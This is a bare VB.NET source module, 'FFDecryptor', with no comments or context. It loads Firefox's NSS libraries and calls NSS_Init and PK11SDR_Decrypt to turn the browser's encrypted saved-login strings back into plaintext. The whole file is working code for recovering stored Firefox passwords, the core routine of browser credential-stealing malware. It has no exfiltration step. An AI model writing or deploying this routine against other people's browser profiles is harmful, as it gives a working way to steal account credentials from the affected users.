Imports System
Imports System.Runtime.InteropServices
Imports System.Text
Module FFDecryptor
    <DllImport("kernel32.dll")>
    Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function
    Dim NSS3 As IntPtr
    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
    Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long

    Function NSS_Init(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        LoadLibrary(MozillaPath & "mozglue.dll")
        NSS3 = LoadLibrary(MozillaPath & "nss3.dll")
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSS_Init")
        Dim dll As DLLFunctionDelegate = CType(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
        Return dll(configdir)
    End Function

    Function Decrypt(ByVal cypherText As String) As String
        Dim ffDataUnmanagedPointer As IntPtr = IntPtr.Zero
        Dim sb As StringBuilder = New StringBuilder(cypherText)

        Try
            Dim ffData As Byte() = Convert.FromBase64String(cypherText)
            ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length)
            Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length)
            Dim tSecDec As TSECItem = New TSECItem()
            Dim item As TSECItem = New TSECItem()
            item.SECItemType = 0
            item.SECItemData = ffDataUnmanagedPointer
            item.SECItemLen = ffData.Length

            If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then

                If tSecDec.SECItemLen <> 0 Then
                    Dim bvRet As Byte() = New Byte(tSecDec.SECItemLen - 1) {}
                    Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen)
                    Return Encoding.ASCII.GetString(bvRet)
                End If
            End If

        Catch ex As Exception
            Return Nothing
        Finally

            If ffDataUnmanagedPointer <> IntPtr.Zero Then
                Marshal.FreeHGlobal(ffDataUnmanagedPointer)
            End If
        End Try

        Return Nothing
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer

    Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = CType(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function

    <StructLayout(LayoutKind.Sequential)>
    Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As IntPtr
        Public SECItemLen As Integer
    End Structure
End Module